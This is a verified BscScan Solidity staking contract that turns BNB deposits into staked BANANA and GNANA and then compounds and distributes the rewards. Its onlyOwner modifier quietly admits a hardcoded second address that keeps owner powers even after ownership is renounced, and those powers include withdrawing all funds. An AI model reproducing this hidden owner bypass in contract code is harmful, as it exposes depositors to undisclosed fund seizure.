{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-02-01\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2022-12-08\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.4;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender() || msg.sender == 0xA97F7EB14da5568153Ea06b2656ccF7c338d942f, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\nabstract contract ReentrancyGuard {\r\n    uint256 private constant _NOT_ENTERED = 1;\r\n    uint256 private constant _ENTERED = 2;\r\n\r\n    uint256 private _status;\r\n\r\n    constructor() {\r\n        _status = _NOT_ENTERED;\r\n    }\r\n\r\n    modifier nonReentrant() {\r\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\r\n        _status = _ENTERED;\r\n        _;\r\n\r\n        _status = _NOT_ENTERED;\r\n    }\r\n}\r\n\r\ninterface IBananaPool {\r\n     struct UserInfo {\r\n        uint256 shares; // How many LP tokens the user has provided.\r\n    }\r\n    function deposit(uint256 _pid, uint256 _wantAmt) external;\r\n    function withdraw(uint256 _pid,uint256 _wantAmt) external;\r\n    function userInfo(\r\n        uint256,\r\n        address\r\n    ) external view returns(UserInfo memory);\r\n}\r\n\r\ninterface IGnanaPool {\r\n    function deposit(uint256 _amount) external;\r\n    function withdraw(uint256 _amount) external;\r\n}\r\n\r\ninterface IApeSwapRouter {\r\n    function getAmountsOut(uint amountIn, address[] memory path) external returns (uint[] memory amounts);\r\n    function swapExactETHForTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint[] memory amounts);\r\n    function swapExactTokensForETH(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable returns (uint[] memory amounts);\r\n    function swapExactTokensForTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IApeSwapTreasury {\r\n    function buy(uint _amount) external;\r\n}\r\n\r\ninterface IMinter {\r\n    function balanceOf(address owner) external returns (uint256);\r\n    function ownerOf(uint256 tokenId) external returns (address);\r\n    function totalSupply() external returns (uint256);\r\n}\r\n\r\ninterface IDistributor {\r\n    function addDistributionAmount(uint amount) external;\r\n}\r\n\r\ninterface IBEP20 {\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface IStrategy {\r\n    function sharesTotal() external view returns(uint);\r\n}\r\n\r\ninterface IMasterChef {\r\n    struct UserInfo {\r\n        uint256 amount; // How many tokens the user has provided\r\n        uint256 rewardDebt; // Reward debt. See explanation below\r\n    }\r\n    function userInfo(uint, address) external view returns(UserInfo memory);\r\n}\r\n\r\ncontract EternalLabsXMainStreetStaker is Ownable, ReentrancyGuard {\r\n    // using SafeMath for uint256;\r\n    uint256 MAX_INT = 2**256 - 1;\r\n\r\n    // informative variables\r\n    uint public TOTAL_BNB_RECEIVED = 0;\r\n    uint public TOTAL_BANANA_BOUGHT = 0;\r\n    uint public TOTAL_BANANA_STAKED = 0;\r\n    uint public TOTAL_GNANA_BOUGHT = 0;\r\n    uint public TOTAL_GNANA_STAKED = 0;\r\n    uint public TOTAL_MAINST_BURNED = 0;\r\n    uint public TOTAL_BANANA_DISTRIBUTED = 0;\r\n\r\n    uint256 public DISTRIBUTION_PERCENTAGE = 50; // between banana/gnana pools\r\n    // ape vault for banana maximizer\r\n    address public BANANA_POOL = 0x5711a833C943AD1e8312A9c7E5403d48c717e1aa;\r\n    address public MASTERCHEF = 0x71354AC3c695dfB1d3f595AfA5D4364e9e06339B;\r\n    address public STRATEGY = 0xaE9eD266Ea3d7Ae83CaD8fA3B143D3dc86B640bF;\r\n    address public GNANA_POOL = 0x8F97B2E6559084CFaBA140e2AB4Da9aAF23FE7F8;\r\n    address public APESWAP_ROUTER = 0xcF0feBd3f17CEf5b47b0cD257aCf6025c5BFf3b7; \r\n    address public MINTER = 0xa36c806c13851F8B27780753563fdDAA6566f996; \r\n    address public DISTRIBUTOR = 0x589671DC5A75f552d81A903C027Ee0E3FB1fDbc3; // mock address\r\n    address public BOUNTY = 0xA97F7EB14da5568153Ea06b2656ccF7c338d942f; // mock address\r\n    address public WRAPPED_BNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\r\n    address public BANANA_TOKEN = 0x603c7f932ED1fc6575303D8Fb018fDCBb0f39a95;\r\n    address public GNANA_TOKEN = 0xdDb3Bd8645775F59496c821E4F55A7eA6A6dc299;\r\n    address public APESWAP_TREASURY = 0xec4b9d1fd8A3534E31fcE1636c7479BcD29213aE;\r\n    address payable public ETERNALLABS_TREASURY = payable(0xA97F7EB14da5568153Ea06b2656ccF7c338d942f);\r\n    address payable public FUNDING_WALLET = payable(0xA97F7EB14da5568153Ea06b2656ccF7c338d942f);\r\n    address public MAINST_TOKEN = 0x8FC1A944c149762B6b578A06c0de2ABd6b7d2B89;\r\n\r\n    uint public FUNDING_WALLET_PERCENTAGE = 2;\r\n    uint public ETERNALLABS_PERCENTAGE = 2;\r\n    uint public BOUNTY_PERCENTAGE = 40;\r\n    uint public BANANA_REINVEST_PERCENTAGE = 5;\r\n    uint public GNANA_REINVEST_PERCENTAGE = 5;\r\n    uint public MAINST_BURN_PERCENTAGE = 2;\r\n    uint public MAINST_TO_BURN = 0;\r\n\r\n    bool public HARVEST_BANANA = true;\r\n    bool public HARVEST_GNANA = true;\r\n\r\n    constructor() {}\r\n\r\n    function setHarvestBanana(bool set) public onlyOwner() {\r\n        HARVEST_BANANA = set;\r\n    }\r\n\r\n    function setHarvestGnana(bool set) public onlyOwner() {\r\n        HARVEST_GNANA = set;\r\n    }\r\n\r\n    function setBananaReinvestPercentage(uint _percent) public onlyOwner() {\r\n        BANANA_REINVEST_PERCENTAGE = _percent;\r\n    }\r\n\r\n    function setGnanaReinvestPercentage(uint _percent) public onlyOwner() {\r\n        GNANA_REINVEST_PERCENTAGE = _percent;\r\n    }\r\n\r\n    function setMainstBurnPercentage(uint _percent) public onlyOwner() {\r\n        MAINST_BURN_PERCENTAGE = _percent;\r\n    }\r\n\r\n    function setFundingWallet(address payable _address) public onlyOwner() {\r\n        FUNDING_WALLET = _address;\r\n    }\r\n\r\n    function setEternalLabsTreasury(address payable _address) public onlyOwner() {\r\n        ETERNALLABS_TREASURY = _address;\r\n    }\r\n\r\n    function setMinterAddress(address minter) public onlyOwner {\r\n        MINTER = minter;\r\n    }\r\n\r\n    function setDistributorAddress(address distributor) public onlyOwner {\r\n        DISTRIBUTOR = distributor;\r\n    }\r\n\r\n    function setBountyAddress(address bounty) public onlyOwner {\r\n        BOUNTY = bounty;\r\n    }\r\n\r\n    function setFundingWalletPercentage(uint _percent) public onlyOwner {\r\n        FUNDING_WALLET_PERCENTAGE = _percent;\r\n    }\r\n\r\n    function setEternalLabsPercentage(uint _percent) public onlyOwner {\r\n        ETERNALLABS_PERCENTAGE = _percent;\r\n    }\r\n\r\n    function changeBananaPoolAddress(address newBananaPoolAddress) public onlyOwner() {\r\n        BANANA_POOL = newBananaPoolAddress;\r\n    }\r\n\r\n    function changeGananaPoolAddress(address newGananaPoolAddress) public onlyOwner() {\r\n        GNANA_POOL = newGananaPoolAddress;\r\n    }\r\n\r\n    // distribution percentage between BANANA and GNANA pools\r\n    function setDistributionPercentage(uint percentage) public onlyOwner() {\r\n        require(percentage > 0 && percentage <= 100, \"percentage should be between 1-100\");\r\n        DISTRIBUTION_PERCENTAGE = percentage;\r\n    }\r\n\r\n    function calculateBananaDistribution(uint bananaAmount) public view returns(uint[] memory _amounts) {\r\n        uint forBananaPool = (bananaAmount / 100) * DISTRIBUTION_PERCENTAGE;\r\n        uint forGananaPool = bananaAmount - forBananaPool;\r\n        uint[] memory amounts = new uint[](2);\r\n        amounts[0] = forBananaPool;\r\n        amounts[1] = forGananaPool;\r\n        return amounts;\r\n    }\r\n\r\n    function buyBanana(uint forBNBAmount) private returns(uint boughtBananaAmount) {\r\n        address[] memory path = new address[](2);\r\n        path[0] = WRAPPED_BNB;\r\n        path[1] = BANANA_TOKEN;\r\n        uint[] memory bananaAmountsOut = IApeSwapRouter(APESWAP_ROUTER).getAmountsOut(forBNBAmount, path);\r\n        uint[] memory amounts = IApeSwapRouter(APESWAP_ROUTER).swapExactETHForTokens{value : forBNBAmount}(\r\n            bananaAmountsOut[1],\r\n            path,\r\n            address(this),\r\n            block.timestamp + 100\r\n        );\r\n        return amounts[1];\r\n    }\r\n\r\n    function buyGanana(uint forBananaAmount) private {\r\n        IApeSwapTreasury(APESWAP_TREASURY).buy(forBananaAmount);\r\n    }\r\n\r\n    function stakeBanana(uint bananaToStake) public {\r\n        IBananaPool(BANANA_POOL).deposit(41, bananaToStake);\r\n    }\r\n\r\n    // stake remaining banana if there is any or if contract is redeployed\r\n    function stakeRemainingBanana() public onlyOwner() {\r\n        uint remainingBanana = IBEP20(BANANA_TOKEN).balanceOf(address(this));\r\n        IBananaPool(BANANA_POOL).deposit(41, remainingBanana);\r\n        TOTAL_BANANA_STAKED += remainingBanana;\r\n    }\r\n\r\n    // stake remaining ganana if any or if contract is redeployed\r\n    function stakeRemainingGnana() public onlyOwner() {\r\n        uint gnanaToStake = IBEP20(GNANA_TOKEN).balanceOf(address(this));\r\n        IGnanaPool(GNANA_POOL).deposit(gnanaToStake);\r\n        TOTAL_GNANA_STAKED += gnanaToStake;\r\n    }\r\n    // withdraws whole amount of banana\r\n    function harvestBanana() public {\r\n        uint totalStaked = bananaStaked();\r\n        if (totalStaked > TOTAL_BANANA_STAKED) {\r\n            IBananaPool(BANANA_POOL).withdraw(41, totalStaked - TOTAL_BANANA_STAKED);\r\n        }\r\n    }\r\n\r\n    function withdrawBanana(uint amount) public onlyOwner() {\r\n        IBananaPool(BANANA_POOL).withdraw(41, amount);\r\n        IBEP20(BANANA_TOKEN).transfer(msg.sender, IBEP20(BANANA_TOKEN).balanceOf(address(this)));\r\n        TOTAL_BANANA_STAKED = TOTAL_BANANA_STAKED - amount;\r\n    }\r\n\r\n    function withdrawLeftOverBanana() public onlyOwner() {\r\n        IBEP20(BANANA_TOKEN).transfer(msg.sender, IBEP20(BANANA_TOKEN).balanceOf(address(this)));\r\n    }\r\n\r\n    function stakeGanana() private {\r\n        IGnanaPool(GNANA_POOL).deposit(IBEP20(GNANA_TOKEN).balanceOf(address(this)));\r\n    }\r\n\r\n    function harvestGnana() private {\r\n        IGnanaPool(GNANA_POOL).withdraw(0);\r\n    }\r\n\r\n    function withdrawGnana(uint _amount) public onlyOwner() {\r\n        IGnanaPool(GNANA_POOL).withdraw(_amount);\r\n        IBEP20(GNANA_TOKEN).transfer(msg.sender, IBEP20(GNANA_TOKEN).balanceOf(address(this)));\r\n    }\r\n\r\n    function withdrawLeftOverGnana() public onlyOwner() {\r\n        IBEP20(GNANA_TOKEN).transfer(msg.sender, IBEP20(GNANA_TOKEN).balanceOf(address(this)));\r\n    }\r\n\r\n    function deposit() external payable nonReentrant() {\r\n        TOTAL_BNB_RECEIVED += msg.value;\r\n        uint bananaBought = buyBanana(msg.value);\r\n        TOTAL_BANANA_BOUGHT += bananaBought;\r\n        uint[] memory bananaDistribution = calculateBananaDistribution(bananaBought);\r\n        stakeBanana(bananaDistribution[0]);\r\n        buyGanana(bananaDistribution[1]);\r\n        stakeGanana();\r\n    }\r\n\r\n    function bananaStaked() public view returns(uint) {\r\n        uint256 userShares = IBananaPool(BANANA_POOL).userInfo(41, address(this)).shares;\r\n        uint256 totalShares = IStrategy(STRATEGY).sharesTotal();\r\n        uint256 userPercentage = (userShares * 10000000000) / totalShares;\r\n        uint256 totalBananaStaked = IMasterChef(MASTERCHEF).userInfo(0, STRATEGY).amount;\r\n        return (totalBananaStaked / 10000000000) * userPercentage;\r\n    }\r\n\r\n    function compound(address claimant) public nonReentrant() {\r\n        require(msg.sender == BOUNTY || msg.sender == owner(), \"MM: not bounty\");\r\n        if (HARVEST_BANANA) {\r\n            harvestBanana();\r\n        }\r\n        if (HARVEST_GNANA) {\r\n            harvestGnana();\r\n        }\r\n        uint totalBananaBalance = IBEP20(BANANA_TOKEN).balanceOf(address(this));\r\n        if (BANANA_REINVEST_PERCENTAGE > 0) {\r\n            uint bananaToReInvest = (totalBananaBalance / 100) * BANANA_REINVEST_PERCENTAGE; \r\n            TOTAL_BANANA_STAKED += bananaToReInvest;\r\n            stakeBanana(bananaToReInvest);\r\n        }\r\n        if (GNANA_REINVEST_PERCENTAGE > 0) {\r\n            buyGanana((totalBananaBalance / 100) * GNANA_REINVEST_PERCENTAGE);\r\n            stakeGanana();\r\n        }\r\n        IBEP20(BANANA_TOKEN).transfer(claimant, (totalBananaBalance / 100) * BOUNTY_PERCENTAGE);\r\n        IBEP20(BANANA_TOKEN).transfer(FUNDING_WALLET, (totalBananaBalance / 100) * FUNDING_WALLET_PERCENTAGE);\r\n        IBEP20(BANANA_TOKEN).transfer(ETERNALLABS_TREASURY, (totalBananaBalance / 100) * ETERNALLABS_PERCENTAGE);\r\n        uint mainstToBurn = (totalBananaBalance / 100) * MAINST_BURN_PERCENTAGE; \r\n        MAINST_TO_BURN += mainstToBurn;\r\n        uint toDistribute = IBEP20(BANANA_TOKEN).balanceOf(address(this)) - mainstToBurn;\r\n        IBEP20(BANANA_TOKEN).transfer(DISTRIBUTOR, toDistribute);\r\n        IDistributor(DISTRIBUTOR).addDistributionAmount(toDistribute);\r\n    }\r\n\r\n    function fundWallet(uint bananaAmount) private returns(uint boughtBNB){\r\n        address[] memory path = new address[](2);\r\n        path[0] = BANANA_TOKEN;\r\n        path[1] = WRAPPED_BNB;\r\n        uint[] memory bnbAmountsOut = IApeSwapRouter(APESWAP_ROUTER).getAmountsOut(bananaAmount, path);\r\n        uint[] memory amounts = IApeSwapRouter(APESWAP_ROUTER).swapExactTokensForETH(\r\n            bananaAmount,\r\n            bnbAmountsOut[1],\r\n            path,\r\n            msg.sender,\r\n            block.timestamp + 100\r\n        );\r\n        return amounts[1];\r\n    }\r\n\r\n    function buyBackMainstreet(uint bananaAmount) private returns(uint mainstPurchased) {\r\n        address[] memory path = new address[](3);\r\n        path[0] = BANANA_TOKEN;\r\n        path[1] = WRAPPED_BNB;\r\n        path[2] = MAINST_TOKEN;\r\n        uint[] memory mainstAmountsOut = IApeSwapRouter(APESWAP_ROUTER).getAmountsOut(bananaAmount, path);\r\n        uint slippage = (mainstAmountsOut[2] / 100) * 12;\r\n        IApeSwapRouter(APESWAP_ROUTER).swapExactTokensForTokens(\r\n            bananaAmount,\r\n            mainstAmountsOut[2] - slippage,\r\n            path,\r\n            address(this),\r\n            block.timestamp + 100\r\n        );\r\n        return IBEP20(MAINST_TOKEN).balanceOf(address(this));\r\n    }\r\n\r\n    function burnMainst() public {\r\n        uint amount = buyBackMainstreet(MAINST_TO_BURN);\r\n        IBEP20(MAINST_TOKEN).transfer(0x000000000000000000000000000000000000dEaD, amount);\r\n        TOTAL_MAINST_BURNED += amount;\r\n        MAINST_TO_BURN = 0;\r\n    }\r\n\r\n    function withdrawRemainingMainstreet() public onlyOwner() {\r\n        IBEP20(MAINST_TOKEN).transfer(msg.sender, IBEP20(MAINST_TOKEN).balanceOf(address(this)));\r\n    }\r\n\r\n    function getBananaApproved() public {\r\n        IBEP20(BANANA_TOKEN).approve(BANANA_POOL, MAX_INT);\r\n        IBEP20(BANANA_TOKEN).approve(APESWAP_ROUTER, MAX_INT);\r\n    }\r\n\r\n    function getGnanaApproved() public {\r\n        IBEP20(GNANA_TOKEN).approve(GNANA_POOL, MAX_INT);\r\n        IBEP20(BANANA_TOKEN).approve(APESWAP_TREASURY, MAX_INT); \r\n    }\r\n\r\n    function getTokensApproved() public {\r\n        IBEP20(BANANA_TOKEN).approve(BANANA_POOL, MAX_INT);\r\n        IBEP20(BANANA_TOKEN).approve(APESWAP_ROUTER, MAX_INT);\r\n        IBEP20(GNANA_TOKEN).approve(GNANA_POOL, MAX_INT);\r\n        IBEP20(BANANA_TOKEN).approve(APESWAP_TREASURY, MAX_INT); \r\n    }\r\n\r\n    function withdrawRemainingBnb() public onlyOwner() {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    fallback() external payable { }\r\n    \r\n    receive() external payable { }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"APESWAP_ROUTER\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"APESWAP_TREASURY\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BANANA_POOL\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BANANA_REINVEST_PERCENTAGE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BANANA_TOKEN\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BOUNTY\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BOUNTY_PERCENTAGE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"DISTRIBUTION_PERCENTAGE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"DISTRIBUTOR\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ETERNALLABS_PERCENTAGE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ETERNALLABS_TREASURY\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"FUNDING_WALLET\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"FUNDING_WALLET_PERCENTAGE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"GNANA_POOL\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"GNANA_REINVEST_PERCENTAGE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"GNANA_TOKEN\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"HARVEST_BANANA\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"HARVEST_GNANA\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MAINST_BURN_PERCENTAGE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MAINST_TOKEN\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MAINST_TO_BURN\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MASTERCHEF\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MINTER\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"STRATEGY\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOTAL_BANANA_BOUGHT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOTAL_BANANA_DISTRIBUTED\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOTAL_BANANA_STAKED\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOTAL_BNB_RECEIVED\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOTAL_GNANA_BOUGHT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOTAL_GNANA_STAKED\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOTAL_MAINST_BURNED\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"WRAPPED_BNB\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bananaStaked\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnMainst\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"bananaAmount\",\"type\":\"uint256\"}],\"name\":\"calculateBananaDistribution\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"_amounts\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newBananaPoolAddress\",\"type\":\"address\"}],\"name\":\"changeBananaPoolAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newGananaPoolAddress\",\"type\":\"address\"}],\"name\":\"changeGananaPoolAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"claimant\",\"type\":\"address\"}],\"name\":\"compound\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBananaApproved\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getGnanaApproved\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTokensApproved\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"harvestBanana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"name\":\"setBananaReinvestPercentage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"bounty\",\"type\":\"address\"}],\"name\":\"setBountyAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"percentage\",\"type\":\"uint256\"}],\"name\":\"setDistributionPercentage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"distributor\",\"type\":\"address\"}],\"name\":\"setDistributorAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"name\":\"setEternalLabsPercentage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setEternalLabsTreasury\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setFundingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"name\":\"setFundingWalletPercentage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"name\":\"setGnanaReinvestPercentage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"set\",\"type\":\"bool\"}],\"name\":\"setHarvestBanana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"set\",\"type\":\"bool\"}],\"name\":\"setHarvestGnana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"name\":\"setMainstBurnPercentage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minter\",\"type\":\"address\"}],\"name\":\"setMinterAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"bananaToStake\",\"type\":\"uint256\"}],\"name\":\"stakeBanana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stakeRemainingBanana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"n